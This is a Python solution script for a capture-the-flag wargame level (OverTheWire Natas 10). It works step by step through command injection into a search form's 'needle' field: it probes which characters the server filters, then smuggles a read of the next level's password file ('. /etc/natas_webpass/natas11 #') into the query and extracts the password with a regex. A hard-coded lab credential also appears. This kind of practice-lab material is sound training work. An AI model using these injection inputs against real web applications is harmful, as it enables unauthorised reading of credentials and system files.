#!/usr/bin/env python

import requests
import re

user = 'natas10'
passw = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'  # from previous level
url = 'http://%s.natas.labs.overthewire.org' % user


# 1st step:  print the sourcecode
'''
r = requests.get(url, auth=(user, passw))
print(r.text)
'''


# 2nd step:  looks like the same challange, let's assume it's more realistic and we cannot see the sourcecode
'''
r = requests.post(url, auth=(user, passw), data={"submit":"submit", "needle":"; ls"})
print(r.text)
''' 
# ok we are getting illegal character, let's try other characters


# 3rd step:  identifying illegal characters
'''
r = requests.post(url, auth=(user, passw), data={"submit":"submit", "needle":"; ls"})
to_compare = r.text
banlist = [';']  # this is a list of illegal characters
allowed = []

toTry = ['#', '.', '/', '-', '!', '$', '%', '&', '(', ')', '=', '|', '\"', '\'', '?']  # important characters came to my mind

for char in toTry:
    r = requests.post(url, auth=(user, passw), data={"submit":"submit", "needle": char})
    new_text = r.text
    if new_text == to_compare:  # means it's an illegal char
        banlist.append(char)
    else:
        allowed.append(char)  # means it's not an illegal char
print('These are illegal:', banlist)
print('These are allowed:', allowed)
'''

''' output:
These are illegal: [';', '&', '|']
These are allowed: ['#', '.', '/', '-', '!', '$', '%', '(', ')', '=', '"', "'", '?']
'''

# 4th step:  we can use '.' and '#' for our task
r = requests.post(url, auth=(user, passw), data={"submit":"submit", "needle":". /etc/natas_webpass/natas11 #"})
webPage = r.text
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())
